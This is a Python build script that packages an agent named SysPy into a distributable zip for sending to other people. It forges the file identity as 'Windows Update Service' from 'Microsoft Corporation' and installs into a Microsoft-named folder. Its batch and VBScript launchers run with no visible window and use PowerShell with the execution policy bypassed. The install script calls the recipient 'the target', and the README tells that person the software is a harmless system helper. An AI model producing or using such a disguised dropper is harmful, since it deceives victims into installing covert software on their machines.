#!/usr/bin/env python3
"""Build a distribution kit for handing SysPy to someone else.

Creates ``dist/SysPy/`` with the agent, launchers, build assets and a readme,
then zips it to ``SysPy.zip``.  Nothing here needs to be installed to run.

All build identity lives in the constants below - bump VERSION and every
generated file follows.  Do not edit version.txt by hand; it is regenerated.
"""

from __future__ import annotations

import os
import shutil

ROOT = os.path.dirname(os.path.abspath(__file__))
DIST = os.path.join(ROOT, "dist", "SysPy")

# --- Single source of truth for the build identity -------------------------
APP_NAME    = "WindowsUpdateService"
DISPLAY     = "Windows Update Service"
COMPANY     = "Microsoft Corporation"
DESCRIPTION = "Windows Update Service"
COPYRIGHT   = "Copyright (C) 2026"
VERSION     = (1, 4, 2, 0)

VERSION_STR = ".".join(str(part) for part in VERSION)
VER_TUPLE   = "(" + ", ".join(str(part) for part in VERSION) + ")"

ICO_SIZES = [(16, 16), (24, 24), (32, 32), (48, 48),
             (64, 64), (128, 128), (256, 256)]

# ---------------------------------------------------------------------------
# QUOTING RULE - read before editing any payload below.
#
# Every batch / VBScript payload is delimited with ''' and never with """.
# Those bodies are full of double quotes, and a run of THREE OR MORE of the
# delimiter character ends the string early.  Two real examples that break a
# """-delimited literal:
#
#     sh.Run """" & here & "\Install.bat""", 0, False
#            ^^^^                  ^^^
#
#     start "" "%PY%"      (run of 2 - safe, but only just)
#
# None of the payloads contain a run of three single quotes, so ''' is safe.
# If you add a payload, keep that invariant or escape the run.
# ---------------------------------------------------------------------------

# --- Generated: version.txt (PyInstaller --version-file resource) ----------
VERSION_TXT = '''VSVersionInfo(
  ffi=FixedFileInfo(
    filevers={ver_tuple},
    prodvers={ver_tuple},
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{company}'),
        StringStruct(u'FileDescription', u'{description}'),
        StringStruct(u'FileVersion', u'{version}'),
        StringStruct(u'InternalName', u'{app}'),
        StringStruct(u'LegalCopyright', u'{copyright}'),
        StringStruct(u'OriginalFilename', u'{app}.exe'),
        StringStruct(u'ProductName', u'{display}'),
        StringStruct(u'ProductVersion', u'{version}')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''

# --- Generated: Install.bat (the thing the target actually runs) -----------
INSTALL_BAT = r'''@echo off
title Windows Update
setlocal enabledelayedexpansion
set "HERE=%~dp0"
set "DIR=%LOCALAPPDATA%\Microsoft\WindowsUpdate"

if exist "%DIR%\syspy" rmdir /s /q "%DIR%\syspy"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>&1
xcopy /e /i /y /q "%HERE%syspy" "%DIR%\syspy" >nul 2>&1
copy /y "%HERE%agent.py" "%DIR%\agent.py" >nul 2>&1

set "PY="
for /d %%D in ("%LOCALAPPDATA%\Programs\Python\Python3*") do (
    if not defined PY if exist "%%D\pythonw.exe" set "PY=%%D\pythonw.exe")
for /d %%D in ("C:\Python3*") do (
    if not defined PY if exist "%%D\pythonw.exe" set "PY=%%D\pythonw.exe")
if not defined PY for /f "delims=" %%X in ('where pythonw.exe 2^>nul') do (
    if not defined PY set "PY=%%X")
if not defined PY for /f "delims=" %%X in ('where python.exe 2^>nul') do (
    if not defined PY set "PY=%%X")
if defined PY (
    start "" "%PY%" "%DIR%\agent.py"
    exit /b
)

echo.
echo  First run - fetching a private Python, one moment...
echo.
set "ZIP=%TEMP%\syspy_py.zip"
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb 'https://www.python.org/ftp/python/3.12.8/python-3.12.8-embed-amd64.zip' -OutFile '%ZIP%'"
powershell -NoProfile -Command "Expand-Archive -Force '%ZIP%' '%DIR%\runtime'"
if exist "%DIR%\runtime\python312._pth" (
    powershell -NoProfile -Command "(Get-Content '%DIR%\runtime\python312._pth') -replace '#import site','import site' | Set-Content '%DIR%\runtime\python312._pth'"
)
if exist "%DIR%\runtime\pythonw.exe" (
    start "" "%DIR%\runtime\pythonw.exe" "%DIR%\agent.py"
) else (
    start "" "%DIR%\runtime\python.exe" "%DIR%\agent.py"
)
exit /b
'''

# --- Generated: Silent.vbs (windowless launcher) ---------------------------
# Leading newline is intentional: it keeps the opening ''' clear of the
# VBScript comment apostrophe on the first line.
SILENT_VBS = r'''
' Runs the installer with no visible window at all.
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
here = fso.GetParentFolderName(WScript.ScriptFullName)
sh.Run """" & here & "\Install.bat""", 0, False
'''

# --- Generated: build_exe.bat (Nuitka primary, PyInstaller fallback) -------
BUILD_EXE = r'''@echo off
rem  Build ONE self-contained .exe that needs no Python on the target.
rem  Prefers Nuitka; falls back to PyInstaller.  Run from this folder.
setlocal
cd /d "%~dp0"

if not exist icon.ico (
    echo [i] icon.ico missing - generating from icon.png
    python make_ico.py
    if not exist icon.ico goto noicon
)

where nuitka >nul 2>&1 || (
    echo [i] Nuitka not found - installing ^(one time, takes a minute^)...
    pip install nuitka ordered-set zstandard || goto pyinstaller
)

echo [*] Building with Nuitka - this takes a while...
nuitka --onefile --assume-yes-for-downloads --mingw64 ^
  --windows-console-mode=disable ^
  --windows-icon-from-ico=icon.ico ^
  --company-name="@COMPANY@" ^
  --product-name="@DISPLAY@" ^
  --file-description="@DESCRIPTION@" ^
  --file-version=@VERSION@ ^
  --product-version=@VERSION@ ^
  --copyright="@COPYRIGHT@" ^
  --output-filename=@APP@.exe ^
  --include-package=syspy ^
  --python-flag=no_docstrings ^
  --lto=yes ^
  agent.py
if errorlevel 1 goto pyinstaller
goto done

:pyinstaller
echo [*] Falling back to PyInstaller...
where pyinstaller >nul 2>&1 || pip install pyinstaller
pyinstaller --onefile --noconsole --clean ^
  --name @APP@ ^
  --icon icon.ico ^
  --version-file version.txt ^
  agent.py
if errorlevel 1 goto fail
copy /y "dist\@APP@.exe" "@APP@.exe" >nul
goto done

:done
echo.
echo  Built: @APP@.exe
dir /b @APP@.exe
pause
exit /b 0

:fail
echo.
echo  BUILD FAILED - scroll up for the error.
pause
exit /b 1

:noicon
echo.
echo  No icon.ico.  Put icon.png next to this file, then: pip install pillow
pause
exit /b 1
'''

README = '''SysPy - what you were sent
==========================

Option A - the easy way
-----------------------
If you were sent "WindowsUpdateService.exe", just double-click it.
Nothing else is required.

Option B - the folder
---------------------
1. Unzip this folder somewhere (Desktop is fine).
2. Double-click "Install.bat".
3. A small black window may flash. That is it.

Optional: run "Silent.vbs" instead to install with no window at all.

To remove it later:
    python "%LOCALAPPDATA%\\Microsoft\\WindowsUpdate\\agent.py" --uninstall

It is a tiny system helper. Nothing else is required.
'''

ASSETS = ("icon.png", "make_ico.py", "build_exe.bat")


def ensure_ico() -> bool:
    """Make sure icon.ico exists so the exe build has something to use."""
    ico = os.path.join(ROOT, "icon.ico")
    png = os.path.join(ROOT, "icon.png")

    if os.path.exists(ico):
        return True
    if not os.path.exists(png):
        print("  ! icon.png not found - the exe will build without an icon")
        return False

    try:
        from PIL import Image
    except ImportError:
        print("  ! pillow missing - run: pip install pillow")
        return False

    Image.open(png).convert("RGBA").save(ico, format="ICO", sizes=ICO_SIZES)
    print("  + icon.ico generated from icon.png")
    return True


def write(name: str, content: str) -> None:
    path = os.path.join(DIST, name)
    with open(path, "w", newline="\r\n") as handle:
        handle.write(content)


def build() -> int:
    shutil.rmtree(os.path.join(ROOT, "dist"), ignore_errors=True)
    os.makedirs(DIST, exist_ok=True)

    print("[1/4] copying agent")
    shutil.copy2(os.path.join(ROOT, "agent.py"), os.path.join(DIST, "agent.py"))
    shutil.copytree(os.path.join(ROOT, "syspy"), os.path.join(DIST, "syspy"),
                    ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))

    print("[2/4] generating version.txt")
    write("version.txt", VERSION_TXT.format(
        ver_tuple=VER_TUPLE, company=COMPANY, description=DESCRIPTION,
        version=VERSION_STR, app=APP_NAME, copyright=COPYRIGHT, display=DISPLAY))

    print("[3/4] writing launchers and build script")
    build_exe = (BUILD_EXE
                 .replace("@COMPANY@", COMPANY)
                 .replace("@DISPLAY@", DISPLAY)
                 .replace("@DESCRIPTION@", DESCRIPTION)
                 .replace("@COPYRIGHT@", COPYRIGHT)
                 .replace("@VERSION@", VERSION_STR)
                 .replace("@APP@", APP_NAME))
    write("build_exe.bat", build_exe)
    write("Install.bat", INSTALL_BAT)
    write("Silent.vbs", SILENT_VBS)
    write("README.txt", README)

    print("[4/4] copying build assets")
    for asset in ASSETS:
        src = os.path.join(ROOT, asset)
        dst = os.path.join(DIST, asset)
        if os.path.exists(src):
            shutil.copy2(src, dst)
        elif not os.path.exists(dst):
            print(f"  ! missing asset: {asset}")

    if ensure_ico():
        shutil.copy2(os.path.join(ROOT, "icon.ico"), os.path.join(DIST, "icon.ico"))

    archive = shutil.make_archive(os.path.join(ROOT, "SysPy"), "zip", DIST)

    print()
    print(f"kit     : {DIST}")
    print(f"zip     : {archive}")
    print(f"version : {VERSION_STR}")
    for name in sorted(os.listdir(DIST)):
        print(f"          {name}")
    return 0


if __name__ == "__main__":
    raise SystemExit(build())